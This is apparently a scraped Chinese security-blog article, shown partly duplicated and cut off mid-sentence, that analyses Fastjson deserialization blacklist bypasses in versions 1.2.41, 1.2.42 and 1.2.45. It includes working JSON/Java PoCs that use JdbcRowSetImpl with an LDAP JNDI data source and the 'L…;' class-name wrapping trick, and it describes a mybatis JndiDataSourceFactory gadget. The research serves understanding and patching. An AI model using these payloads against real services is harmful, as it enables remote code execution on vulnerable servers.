href=\"https://github.com/LeadroyaL/fastjson-blacklist\">https://github.com/LeadroyaL/fastjson-blacklist</a></p>\n<p>除了引入了黑名单加密混淆机制外，checkAutotype中也加入了一些新的机制，如下图这里</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b8159ba031debf45a5a98c088f859ea8.png\"></p>\n<p>与之前的版本相比，这里多出了上图这一段代码。从代码上大体可以猜测出来，这是用来判断类名的第一个字符与最后一个字符是否满足一定条件，然后将首尾剥去。这里又看到熟悉的剥皮操作了，我们不难猜测到这两个满足条件的字符大概率是”L”与”;”。开发者的用意大概是想针对于1.2.41版本的利用”Lcom.sun.rowset.JdbcRowSetImpl;”，先剥去传入类名首尾的”L”与”;”，以便将恶意数据暴露出来，再经过黑名单校验。</p>\n<p>我们写个小测试，看看这俩字符是不是”L”与”;”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0a1d4125f31b560b3d2cfcddd0bcbaf9.png\"></p>\n<p>实践证明，FastJson这里要去除的还真是首尾的”L”与”;”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6298aa075e5553217bd7f5042c484f3e.png\"></p>\n<h3 id=\"漏洞利用-1\"><a href=\"#漏洞利用-1\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>因为这里很容易猜出怎么绕过，因此我们先不贴poc，一步步分析下执行流程最终构造处正确的poc。</p>\n<p>首先程序进入checkAutoType后，进入如下两个if分支进行处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ac1453b99590452916dd6336ef14c1ba.png\"></p>\n<p>第一个if分支，是用来限制传入的类名长度的，这里只要我们传入的poc中类名长度在3与128之间即可。而第二个分支，我们上文已经分析过了，目的是剥去类名中的首尾”L”与”;”。因此构造如下poc即可轻易绕过FastJson1.2.42版本</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,&quot;</span> + <span class=\"string\">&quot; \\&quot;autoCommit\\&quot;:true&#125;&quot;</span>;</span><br><span class=\"line\">Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">System.out.println(obj);</span><br></pre></td></tr></table></figure>\n\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d1f0ba0089fc7f64635cbd52afe5350c.png\"></p>\n<h2 id=\"Fastjson-1-2-45版本漏洞\"><a href=\"#Fastjson-1-2-45版本漏洞\" class=\"headerlink\" title=\"Fastjson 1.2.45版本漏洞\"></a>Fastjson 1.2.45版本漏洞</h2><p>在Fastjson 1.2.45版本中，checkAutotype安全机制又被发现了一种绕过方式。之前的几次绕过都是针对checkAutoType的绕过，而这次则是利用了一条黑名单中不包含的元素，从而绕过了黑名单限制。</p>\n<p>本次绕过利用到的是mybatis库。如果想测试成功，需要额外安装mybatis库。下文测试用例中安装的版本是3.5.5。</p>\n<p>首先简单介绍下mybatis，maven上的简介如下：</p>\n<blockquote>\n<p>“MyBatis SQL映射器框架使将关系数据库与面向对象的应用程序结合使用变得更加容易。MyBatis使用XML描述符或注释将对象与存储过程或SQL语句耦合。相对于对象关系映射工具，简单性是MyBatis数据映射器的最大优势。”</p>\n</blockquote>\n<h3 id=\"漏洞利用-2\"><a href=\"#漏洞利用-2\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>本次利用poc如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/23689542db1576061ec011f3d10ca794.png\"></p>\n<p>从poc中不难发现，@type指定了JndiDataSourceFactory类，而在properties属性中的data_source变量中指定恶意数据源。由于JndiDataSourceFactory并不在黑名单上，因此可以顺利通过黑名单校验，在接下来的反序列化过程中，在为Properties变量赋值时调用其setter方法，可见下图动态调试结果</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8bf6a23d27b5eca427263eee78bb4b71.png\"></p>\n<p>在上图setProperties方法中，程序将取出poc中构造的DATA_SOURCE值并触发漏洞</p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>除了上文分析的漏洞之外，FastJson还有几个很精彩的漏洞，例如Fastjson 1.2.47版本和1.2.68版本的漏洞。因为篇幅有限，要写的实在太多了，因此我把它们抽出来放在后续文章中介绍。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p>本文衔接上一篇文章<a href=\"http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/\">《Fastjson 1.2.24反序列化漏洞深度分析》</a>，继续探讨一下FastJson的历史漏洞。</p>\n<p>在《Fastjson 1.2.24反序列化漏洞深度分析》一文中，我们以Fastjson 1.2.24反序列化漏洞为基础，详细分析fastjson漏洞的一些细节问题。</p>\n<p>Fastjson 1.2.24 版本的远程代码执行漏洞可谓是开辟了近几年来Fastjson漏洞的纪元。在Fastjson 1.2.24版本反序列化漏洞初次披露之后，官方针对这个漏洞进行了修补。然而这个修复方案很快就被发现存在绕过的风险。由于官方的修复方案或多或少都存在着一些问题，随之而来的是一次又一次的绕过与修复。</p>\n<p>回顾一下Fastjson反序列化漏洞，简单来说就是：fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用。com.sun.rowset.JdbcRowSetImpl这条利用链用到的是类中setter方法的缺陷，而TemplatesImpl利用链则用到的是getter方法缺陷。</p>\n<p>官方主要的修复方案是引入了checkAutotype安全机制，通过黑白名单机制进行防御。在随后的版本中，为了增强漏洞绕过的难度，又在checkAutotype中采用了一定的加密混淆将本来明文存储的黑名单进行加密。</p>\n<p>在简单的介绍完Fastjson 1.2.24版本远程代码执行漏洞后，我们来看一下官方是怎么修复这个漏洞的。</p>\n<h2 id=\"checkAutotype安全机制\"><a href=\"#checkAutotype安全机制\" class=\"headerlink\" title=\"checkAutotype安全机制\"></a>checkAutotype安全机制</h2><p>Fastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。我们先来看一下1.2.25版本初次引入的checkAutotype安全机制的形式，首先来看几个示例</p>\n<ol>\n<li>示例一</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> AutoTypeTest;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ForTest</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  String s1;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getS1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setS1</span><span class=\"params\">(String s1)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.s1 = s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.ForTest\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是一个很普通的测试样例，用来将字符串转变为Java对象。执行结果如下</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3d7f965f988e8e297889dc6d75d8f4b6.png\"></p>\n<p>这个测试样例在1.2.24版本是可以执行成功的，但在1.2.25版本中却爆出来autoType is not support错误。</p>\n<p>这是因为Fastjson 1.2.25版本引入了checkAutotype安全机制。在默认情况下AutoTypeSupport关闭且测试样例中的AutoTypeTest.ForTest类虽然不在黑名单上，但也并不在checkAutotype安全机制白名单上，因此使用上图测试样例在Fastjson 1.2.25版本中反序列化失败。</p>\n<ol start=\"2\">\n<li>示例二</li>\n</ol>\n<p>在这个示例中，我们将AutoTypeSupport设置为true</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.ForTest\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在开启AutoTypeSupport后，AutoTypeTest.ForTest类反序列化成功</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/81f432dbf98c947a76eab4f798339a02.png\"></p>\n<ol start=\"3\">\n<li>示例三</li>\n</ol>\n<p>这一次换成恶意类，再进行一次实验</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,&quot;</span> + <span class=\"string\">&quot; \\&quot;autoCommit\\&quot;:true&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>动态调试一下经过动态调试可以发现，程序在执行到com/alibaba/fastjson/parser/ParserConfig.java中checkAutoType安全机制时，com.sun.rowset.JdbcRowSetImpl类会触发黑名单，见下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/19d24d1278cfdd136f09593ad29112a1.png\"></p>\n<p>程序将抛出错误</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5a0becd8ef816df3112cd1d90d1c76aa.png\"></p>\n<p>我们来看一下Fastjson 1.2.25版本中引入的黑名单中元素都有哪些，见下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png\"></p>\n<p>这次实验中的poc无法成功利用，是因为com.sun.rowset.JdbcRowSetImpl类命中了黑名单而不能反序列化成功。</p>\n<p>在这里额外介绍一下：当程序经过黑白名单的校验之后，接下来会通过TypeUtils.loadClass方法对类进行反序列化加载</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png\"></p>\n<p>TypeUtils.loadClass方法的实现比较有意思，下文要介绍的几处漏洞也与之有关。</p>\n<h2 id=\"Fastjson-1-2-41版本漏洞\"><a href=\"#Fastjson-1-2-41版本漏洞\" class=\"headerlink\" title=\"Fastjson 1.2.41版本漏洞\"></a>Fastjson 1.2.41版本漏洞</h2><p>1.2.41版本漏洞利用，其实就是针对1.2.24版本漏洞所打的补丁的绕过，本次漏洞影响了1.2.41版本以及之前的版本</p>\n<p>首先来看一下1.2.41版本漏洞利用的poc</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png\"></p>\n<p>可以发现，@type字段值为”Lcom.sun.rowset.JdbcRowSetImpl;”</p>\n<p>在”com.sun.rowset.JdbcRowSetImpl”类的首尾多出了一个L与;</p>\n<p>经过上文的介绍，我们知道@type字段值会经过黑名单校验</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png\"></p>\n<p>黑名单的检测机制很简单，就是用黑名单中的元素依次与@type字段值进行字符串匹配，从@type字段值从首位开始，匹配到了黑名单中的元素，就会抛出错误。</p>\n<p>很明显，”Lcom.sun.rowset.JdbcRowSetImpl;”并不会匹配到黑名单。但是有一个问题：黑名单匹配机制明显不管@type字段值末位是什么，又是为何在末位加一个”;”呢？首位的”L”又是什么呢？我们随后会介绍一下这个。</p>\n<p>通过上文对checkAutotype安全机制的解释可以发现，@type字段值首先会经过黑白名单的校验。在成功通过校验之后，程序接下来会通过TypeUtils.loadClass方法对类进行加载</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png\"></p>\n<p>让我们来跟入位于com/alibaba/fastjson/util/TypeUtils.java中的loadClass方法</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/905ad768dd7cc2540c00a101956694f1.png\"></p>\n<p>从上图可见，在该方法中有两次if语句，见上图红框处</p>\n<p>从字面意义上来看，第一处的作用是匹配以”[”开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串。</p>\n<p>这一点看起来与poc中的结构很相似，poc中构造的结构应该就是为这里准备的。</p>\n<p>我们接下来就来分析一下，”[”、 ”L”、”;”这些都是什么？以及为什么FastJson为什么要写两处if逻辑来处理他们。</p>\n<h3 id=\"JNI字段描述符\"><a href=\"#JNI字段描述符\" class=\"headerlink\" title=\"JNI字段描述符\"></a>JNI字段描述符</h3><p>首先我们来思考一个题外话，如何获取一个类的数组类型的Class对象？ 可参考下面demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> AutoTypeTest;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Array;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ForTest</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  String s1;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ForTest</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.s1 =<span class=\"string\">&quot;1&quot;</span> ;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getS1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setS1</span><span class=\"params\">(String s1)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.s1 = s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> ClassNotFoundException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//方法一</span></span><br><span class=\"line\">        ForTest[] ar = <span class=\"keyword\">new</span> ForTest[<span class=\"number\">1</span>];</span><br><span class=\"line\">        Class&lt;?&gt; clazz1 =  ar.getClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//方法二</span></span><br><span class=\"line\">        Class&lt;?&gt; clazz2 = Array.newInstance(ForTest.class, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//方法三</span></span><br><span class=\"line\">        Class clazz3 = Class.forName(<span class=\"string\">&quot;[LAutoTypeTest.ForTest;&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>上述demo中三种方式都可以获取一个类的数组类型的Class对象</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b9770b8f656ab3a4ebbb42e9f82e3406.png\"></p>\n<p>通过调试结果可见，clazz1、clazz2、clazz3的name是一样的，都为字符串”[LAutoTypeTest.ForTest;”。</p>\n<p>”[LAutoTypeTest.ForTest;”这种形式的字符串其实是一种对函数返回值和参数的编码，名为JNI字段描述符（JavaNative Interface FieldDescriptors)。</p>\n<p>AutoTypeTest.ForTest类的Class对象名为”AutoTypeTest.ForTest”；为了区分，AutoTypeTest.ForTest类的数组类型的Class对象名则为”[LAutoTypeTest.ForTest;”这样的形式。其中首个字符”[”用以表示数组的层数，而第二个字符则代表数组的类型。</p>\n<p>这里举例说明一下JNI字段描述符的格式：</p>\n<ul>\n<li><p>double[][]对应的类对象名为”[[D”</p>\n</li>\n<li><p>int[]对应的类对象名则为”[I”</p>\n</li>\n<li><p>AutoTypeTest.ForTest[]对应的类对象名则为”[LAutoTypeTest.ForTest;”</p>\n</li>\n</ul>\n<p>前两者比较好理解，而第三个”[LAutoTypeTest.ForTest;”，可见第二个字符是”L”,且最后一个字符是”;”。这种形式叫类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）。这就是为什么FastJson中要有下图这样的两处if逻辑，实际上是用来解析传入的数组类型的Class对象字符串</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5cecd42324d592731c44d90c8c21f5b.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>经过我们上文的分析，已经对漏洞以及构造有了一定的了解。接下来重点来看下FastJson解析类描述符的代码，见下图：</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e02029eade7ee2d5a534ee7961eec2c2.png\"></p>\n<p>从上图代码不难看出，当传入的类名以”L”开头，且以”;”结尾时，程序将去除首尾后返回。这意味着，如果在恶意类前后加上”L”与”;”，例如”LAutoTypeTest.ForTest;”，这样不仅可以轻易的躲避黑名单，随后在程序执行到这里时，还会将首尾附加的”L”与”;”剥去。剥皮处理之后字符串变成”AutoTypeTest.ForTest”，接着”AutoTypeTest.ForTest”被loadClass加载，恶意类被成功反序列化利用。我们构造一个如下图的poc，测验以下我们的判断是否是否正确：</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png\"></p>\n<p>经过动态调试后发现，程序的确进入如下if分支，并且剥去前后”L”与”;”</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/204f15e90a91f18369ab74875437598c.png\"></p>\n<p>我们构造的poc执行成功。在poc执行成功后，计算器顺利的弹出</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/02c17ac61b4f3029ea2fa0635bbc2548.png\"></p>\n<p>上述漏洞在Fastjson 1.2.42版本中被修复，从Fastjson 1.2.42版本发布的升级说明中可以看到这点</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/16b8d1899466896e9a2c642d0638a120.png\"></p>\n<h2 id=\"Fastjson-1-2-42版本漏洞\"><a href=\"#Fastjson-1-2-42版本漏洞\" class=\"headerlink\" title=\"Fastjson 1.2.42版本漏洞\"></a>Fastjson 1.2.42版本漏洞</h2><p>Fastjson 1.2.42版本在处理了1.2.41版本的漏洞后。很快又被发现存在着绕过方式。我们接下来分析下Fastjson 1.2.42中的checkAutotype安全机制，看看Fastjson 1.2.42的更新是怎么处理1.2.41版本漏洞的。</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/127e8ce129efb319c1a03119f550f8dc.png\"></p>\n<p>从上图可以发现，不同于之前的版本，程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。此时的黑名单也变成如下的样子</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f796a6f9ed3d05d3f7f4e41c4df4a283.png\"></p>\n<p>针对这里的黑名单的原文明文也是有人曾经研究过的，可以参考如下链接</p>\n<p><a href=\"https://github.com/LeadroyaL/fastjson-blacklist\">https://github.com/LeadroyaL/fastjson-blacklist</a></p>\n<p>除了引入了黑名单加密混淆机制外，checkAutotype中也加入了一些新的机制，如下图这里</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b8159ba031debf45a5a98c088f859ea8.png\"></p>\n<p>与之前的版本相比，这里多出了上图这一段代码。从代码上大体可以猜测出来，这是用来判断类名的第一个字符与最后一个字符是否满足一定条件，然后将首尾剥去。这里又看到熟悉的剥皮操作了，我们不难猜测到这两个满足条件的字符大概率是”L”与”;”。开发者的用意大概是想针对于1.2.41版本的利用”Lcom.sun.rowset.JdbcRowSetImpl;”，先剥去传入类名首尾的”L”与”;”，以便将恶意数据暴露出来，再经过黑名单校验。</p>\n<p>我们写个小测试，看看这俩字符是不是”L”与”;”</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0a1d4125f31b560b3d2cfcddd0bcbaf9.png\"></p>\n<p>实践证明，FastJson这里要去除的还真是首尾的”L”与”;”</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6298aa075e5553217bd7f5042c484f3e.png\"></p>\n<h3 id=\"漏洞利用-1\"><a href=\"#漏洞利用-1\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>因为这里很容易猜出怎么绕过，因此我们先不贴poc，一步步分析下执行流程最终构造处正确的poc。</p>\n<p>首先程序进入checkAutoType后，进入如下两个if分支进行处理</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ac1453b99590452916dd6336ef14c1ba.png\"></p>\n<p>第一个if分支，是用来限制传入的类名长度的，这里只要我们传入的poc中类名长度在3与128之间即可。而第二个分支，我们上文已经分析过了，目的是剥去类名中的首尾”L”与”;”。因此构造如下poc即可轻易绕过FastJson1.2.42版本</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,&quot;</span> + <span class=\"string\">&quot; \\&quot;autoCommit\\&quot;:true&#125;&quot;</span>;</span><br><span class=\"line\">Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">System.out.println(obj);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d1f0ba0089fc7f64635cbd52afe5350c.png\"></p>\n<h2 id=\"Fastjson-1-2-45版本漏洞\"><a href=\"#Fastjson-1-2-45版本漏洞\" class=\"headerlink\" title=\"Fastjson 1.2.45版本漏洞\"></a>Fastjson 1.2.45版本漏洞</h2><p>在Fastjson 